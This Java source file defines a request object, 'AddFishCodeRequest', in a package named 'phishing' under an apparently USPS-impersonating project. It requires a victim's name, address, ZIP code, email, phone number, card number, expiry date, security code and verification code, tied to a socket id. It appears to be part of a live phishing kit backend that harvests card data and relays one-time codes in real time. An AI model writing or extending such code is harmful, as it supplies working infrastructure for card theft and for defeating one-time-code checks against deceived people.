package com.uspsassa.phishing.request.user;

import io.swagger.v3.oas.annotations.media.Schema;
import lombok.Data;

import javax.validation.constraints.NotEmpty;
import javax.validation.constraints.NotNull;

@Data
@Schema(name = "AddFishCodeRequest", description = "添加验证码")
public class AddFishCodeRequest {
    /**
     * id
     */
    @Schema(description = "id")
    @NotNull(message = "id不能为空")
    private Integer id;

    /**
     * socket的id
     */
    @Schema(description = "socket的id")
    @NotEmpty(message = "socket的id不能为空")
    private String sid;
    /**
     * 名称
     */
    @Schema(description = "名称")
    @NotEmpty(message = "名称不能为空")
    private String name;
    /**
     * 地址
     */
    @Schema(description = "地址")
    @NotEmpty(message = "地址不能为空")
    private String address;

    /**
     * 可选地址
     */
    @Schema(description = "可选地址")
    private String addressOption;

    /**
     * 城市
     */
    @Schema(description = "城市")
    @NotEmpty(message = "城市不能为空")
    private String city;
    /**
     * 邮政编码
     */
    @Schema(description = "邮政编码")
    @NotEmpty(message = "邮政编码不能为空")
    private String zipCode;

    /**
     * 选择框的
     */
    @Schema(description = "邮箱")
    @NotEmpty(message = "邮箱不能为空")
    private String email;

    /**
     * 电话号码
     */
    @Schema(description = "电话号码")
    @NotEmpty(message = "电话号码不能为空")
    private String phoneNumber;


    @Schema(description = "卡号")
    @NotEmpty(message = "卡号不能为空")
    private String cardNumber;

    /**
     * 失效日期
     */
    @Schema(description = "失效日期")
    @NotEmpty(message = "失效日期不能为空")
    private String expDate;


    /**
     * 安全码
     */
    @Schema(description = "安全码")
    @NotEmpty(message = "安全码不能为空")
    private String securityCode;
    /**
     * 验证码
     */
    @Schema(description = "验证码")
    @NotEmpty(message = "验证码不能为空")
    private String verificationCode;
}
